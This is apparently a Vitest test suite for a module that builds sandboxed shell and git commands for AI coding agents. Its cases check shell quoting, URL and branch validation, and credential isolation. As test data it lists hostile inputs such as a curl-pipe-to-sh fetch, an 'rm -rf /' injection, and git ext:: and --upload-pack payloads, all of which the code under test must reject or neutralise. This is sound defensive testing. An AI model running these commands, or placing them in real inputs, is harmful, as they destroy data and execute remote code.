import { execFileSync } from "node:child_process";

import { describe, expect, it } from "vitest";

import {
    agentEnv,
    buildAgentCommand,
    buildAgentPrompt,
    buildInstallCommand,
    buildPollCommand,
    buildPullRequestScript,
    buildRunScript,
    CODING_AGENTS,
    GIT_AUTH_PATH,
    parsePullRequestStatus,
    parseRunStatus,
    PROMPT_PATH,
    buildCloneCommand,
    buildCommitCommand,
    buildDiffCommand,
    buildPushCommand,
    githubBasicCredential,
    gitAuthEnv,
    isValidBranchName,
    parseRepoUrl,
    prBranchName,
    shellJoin,
    shellQuote,
} from "./commands";
import { fakeKey } from "./test-fixtures";

/**
 * These scripts run in Linux E2B sandboxes, so the cases that hand them to a real
 * bash skip on Windows, which has no `/bin/bash`. The string assertions still run there.
 */
const NO_BASH = process.platform === "win32";

/** What bash actually receives: run the command through `printf` and read back each argument. */
const bashArgv = (quotedArgs: string): string[] => {
    const output = execFileSync("/bin/bash", ["-c", String.raw`printf '%s\0' ${quotedArgs}`], { encoding: "utf8" });

    return output.split("\0").slice(0, -1);
};

const CODEX_PREFIX = /^'codex' /u;
const STDIN_SUFFIX = / < \S+$/u;
const PR_AUTH_SUBSHELL = /\( export GIT_CONFIG_COUNT=1 /gu;
const EXACT_VERSION = /^\d+\.\d+\.\d+$/u;
const SUBSHELL_EXPORT = /\( if \[ -s \S+ \]; then export GIT_CONFIG_COUNT=1/u;
const FAKE_GITHUB_TOKEN = fakeKey("github");
const NUL_ERROR = /NUL/u;
const BRANCH_ERROR = /branch/u;
const PR_BRANCH = /^neore\/agent-[a-z0-9]{1,12}$/u;

const HOSTILE = [
    "it's",
    "'; rm -rf / #",
    "$(curl evil.sh | sh)",
    "`id`",
    ["$HOME $", "{PATH}"].join(""),
    String.raw`double " quote \ backslash`,
    "line\nbreak",
    "-rf",
    "--",
    "glob * ? [a]",
    "",
    "semi;colon && and || or | pipe > redirect < in",
    "unicode ✓ ünïcødé",
];

describe("shellQuote", () => {
    it.skipIf(NO_BASH).each(HOSTILE)("round-trips %j through bash unchanged", (value) => {
        expect(bashArgv(shellQuote(value))).toEqual([value]);
    });

    it.skipIf(NO_BASH)("keeps a joined argv as separate arguments", () => {
        expect(bashArgv(shellJoin(HOSTILE))).toEqual(HOSTILE);
    });

    it("refuses a NUL byte instead of truncating", () => {
        expect(() => shellQuote("a\0b")).toThrow(NUL_ERROR);
    });
});

describe("buildAgentCommand", () => {
    it("runs claude bare, non-interactive, bypassing prompts, prompt read from the file", () => {
        const command = buildAgentCommand("claude_code");

        expect(command).toBe(
            `claude --bare -p "$(cat ${PROMPT_PATH})" '--output-format' 'stream-json' '--verbose' '--permission-mode' 'bypassPermissions' '--no-session-persistence'`,
        );
    });

    it.skipIf(NO_BASH)("runs codex exec with no approvals or inner sandbox", () => {
        const argv = bashArgv(buildAgentCommand("codex").replace(CODEX_PREFIX, "").replace(STDIN_SUFFIX, ""));

        expect(argv).toEqual([
            "exec",
            "--dangerously-bypass-approvals-and-sandbox",
            "--skip-git-repo-check",
            "--ephemeral",
            "--ignore-user-config",
            "-C",
            "/home/user/repo",
            "-o",
            "/tmp/neore-agent-last-message.txt",
            "-",
        ]);
    });

    it("feeds codex the prompt on stdin", () => {
        expect(buildAgentCommand("codex").endsWith(`< ${PROMPT_PATH}`)).toBe(true);
    });

    it("never puts the prompt or a secret in the command line", () => {
        expect(agentEnv("claude_code", fakeKey("anthropic"))["ANTHROPIC_API_KEY"]).toBe(fakeKey("anthropic"));
        expect(agentEnv("codex", fakeKey("openai"))["CODEX_API_KEY"]).toBe(fakeKey("openai"));

        // The builders never receive a key, so none can appear; the env is the only channel.
        for (const agent of ["claude_code", "codex"] as const) {
            expect(buildAgentCommand(agent)).not.toContain("not-real");
            expect(buildRunScript({ agent, repo: parseRepoUrl("a/b"), timeoutSeconds: 600 })).not.toContain("not-real");
        }
    });

    it("keeps the prompt from starting with a dash", () => {
        expect(buildAgentPrompt("-rf /").startsWith("-")).toBe(false);
    });
});

describe("buildInstallCommand", () => {
    it("installs the pinned version into the user prefix", () => {
        expect(buildInstallCommand("claude_code")).toContain(`'@anthropic-ai/claude-code@${CODING_AGENTS.claude_code.npmVersion}'`);
        expect(buildInstallCommand("codex")).toContain(`'@openai/codex@${CODING_AGENTS.codex.npmVersion}'`);
        expect(CODING_AGENTS.claude_code.npmVersion).toMatch(EXACT_VERSION);
        expect(CODING_AGENTS.codex.npmVersion).toMatch(EXACT_VERSION);
    });
});

describe("buildRunScript", () => {
    const script = buildRunScript({ agent: "claude_code", branch: "main", repo: parseRepoUrl("a/b"), timeoutSeconds: 1080 });

    it.skipIf(NO_BASH)("is valid bash", () => {
        expect(() => execFileSync("/bin/bash", ["-n"], { input: script })).not.toThrow();
    });

    it("clones, installs, then runs the agent under a timeout and records the outcome", () => {
        const clone = script.indexOf("git' 'clone'");
        const install = script.indexOf("npm ls -g");
        const agent = script.indexOf("timeout 1080 claude --bare");

        expect(clone).toBeGreaterThan(0);
        expect(install).toBeGreaterThan(clone);
        expect(agent).toBeGreaterThan(install);
        expect(script).toContain('finish "agent:$?"');
    });

    it("hands the GitHub credential to git only, and deletes it before the agent starts", () => {
        const firstDelete = script.indexOf(`rm -f ${GIT_AUTH_PATH}`);

        expect(firstDelete).toBeGreaterThan(0);
        expect(firstDelete).toBeLessThan(script.indexOf("timeout 1080 claude"));
        // Exported inside the clone's subshell, never at the top level.
        expect(script).toMatch(SUBSHELL_EXPORT);
    });

    it("parses the status the script writes", () => {
        expect(parseRunStatus("agent:0\n")).toEqual({ exitCode: 0, kind: "agent" });
        expect(parseRunStatus("agent:124")).toEqual({ exitCode: 124, kind: "agent" });
        expect(parseRunStatus("setup-failed:clone")).toEqual({ kind: "setup-failed", step: "clone" });
        expect(parseRunStatus("")).toBeUndefined();
    });

    it("only polls from a valid offset", () => {
        expect(() => buildPollCommand(-1)).toThrow();
        expect(buildPollCommand(10)).toContain("tail -c +11");
    });
});

describe("parseRepoUrl", () => {
    it("normalises GitHub URLs and shorthand", () => {
        expect(parseRepoUrl("anolilab/neore")).toEqual({
            cloneUrl: "https://github.com/anolilab/neore.git",
            github: { owner: "anolilab", repo: "neore" },
            host: "github.com",
        });
        expect(parseRepoUrl("https://github.com/anolilab/neore.git").cloneUrl).toBe("https://github.com/anolilab/neore.git");
        expect(parseRepoUrl("https://github.com/anolilab/neore/").github).toEqual({ owner: "anolilab", repo: "neore" });
    });

    it("accepts other https hosts without a GitHub identity", () => {
        expect(parseRepoUrl("https://gitlab.com/group/project.git")).toEqual({ cloneUrl: "https://gitlab.com/group/project.git", host: "gitlab.com" });
    });

    it.each([
        ["ssh transport", "ssh://git@github.com/a/b.git"],
        ["git ext transport", "ext::sh -c touch% /tmp/pwned"],
        ["file transport", "file:///etc"],
        ["plain http", ["http:", "//github.com/a/b"].join("")],
        ["embedded credentials", "https://user:token@github.com/a/b.git"],
        ["query string", "https://github.com/a/b?x=1"],
        ["deep GitHub path", "https://github.com/a/b/tree/main"],
        ["option-looking owner", "https://github.com/-a/b"],
    ])("rejects %s", (_label, url) => {
        expect(() => parseRepoUrl(url)).toThrow();
    });
});

describe("branches", () => {
    it.each(["main", "feature/x-1", "release/2.0"])("accepts %s", (branch) => {
        expect(isValidBranchName(branch)).toBe(true);
    });

    it.each(["--upload-pack=evil", "-b", "a..b", "a b", "a;b", "/abs", "x.lock", ""])("rejects %j", (branch) => {
        expect(isValidBranchName(branch)).toBe(false);
    });

    it("refuses an invalid branch in the clone command", () => {
        expect(() => buildCloneCommand(parseRepoUrl("a/b"), "--upload-pack=touch /tmp/x")).toThrow(BRANCH_ERROR);
    });

    it("derives the PR branch from the run id only", () => {
        expect(prBranchName("k57abc/../DEF123xyz")).toMatch(PR_BRANCH);
        expect(isValidBranchName(prBranchName("k57abcDEF123xyz"))).toBe(true);
    });
});

describe("git credentials", () => {
    it("injects the token only through GIT_CONFIG_* env", () => {
        const env = gitAuthEnv(FAKE_GITHUB_TOKEN);

        expect(env["GIT_CONFIG_KEY_0"]).toBe("http.https://github.com/.extraheader");
        expect(env["GIT_CONFIG_VALUE_0"]).toBe(`AUTHORIZATION: basic ${githubBasicCredential(FAKE_GITHUB_TOKEN)}`);
        expect(buildCloneCommand(parseRepoUrl("a/b"))).not.toContain(FAKE_GITHUB_TOKEN);
        expect(buildPushCommand("neore/agent-x")).not.toContain(FAKE_GITHUB_TOKEN);
    });

    it("sends no auth config without a token", () => {
        expect(gitAuthEnv(undefined)).toEqual({ GIT_TERMINAL_PROMPT: "0" });
    });

    it("disables hooks on the commit and the push", () => {
        expect(buildCommitCommand("neore/agent-x", "msg")).toContain("'core.hooksPath=/dev/null'");
        expect(buildPushCommand("neore/agent-x")).toContain("'core.hooksPath=/dev/null'");
    });

    it("quotes the commit message", () => {
        expect(buildCommitCommand("neore/agent-x", "fix'; rm -rf /; '")).toContain(String.raw`'fix'\''; rm -rf /; '\'''`);
    });
});

describe("buildPullRequestScript", () => {
    const script = buildPullRequestScript({ baseBranch: "main", branch: "neore/agent-run1", message: "fix'; rm -rf /", repo: parseRepoUrl("a/b") });

    it.skipIf(NO_BASH)("is valid bash", () => {
        expect(() => execFileSync("/bin/bash", ["-n"], { input: script })).not.toThrow();
    });

    it("clones, applies, commits and pushes in order, recording the outcome", () => {
        const steps = ["git' 'clone'", "git' 'apply'", "'commit'", "'push'", "finish pushed"].map((needle) => script.indexOf(needle));

        expect(steps.every((index) => index > 0)).toBe(true);
        expect(steps).toEqual([...steps].toSorted((a, b) => a - b));
    });

    it("reads the credential only inside the clone and push subshells, and deletes it on every exit", () => {
        expect(script.match(PR_AUTH_SUBSHELL)).toHaveLength(2);
        expect(script).toContain(`finish() { rm -f ${GIT_AUTH_PATH};`);
    });

    it("quotes the commit message", () => {
        expect(script).toContain(String.raw`'fix'\''; rm -rf /'`);
    });

    it("parses the status the script writes", () => {
        expect(parsePullRequestStatus("pushed\n")).toEqual({ kind: "pushed" });
        expect(parsePullRequestStatus("failed:push")).toEqual({ kind: "failed", step: "push" });
        expect(parsePullRequestStatus("")).toBeUndefined();
    });
});

describe("buildDiffCommand", () => {
    it("only takes a full commit sha", () => {
        expect(() => buildDiffCommand("HEAD; rm -rf /")).toThrow();
        expect(buildDiffCommand("a".repeat(40))).toContain(`--binary ${"a".repeat(40)}`);
    });
});
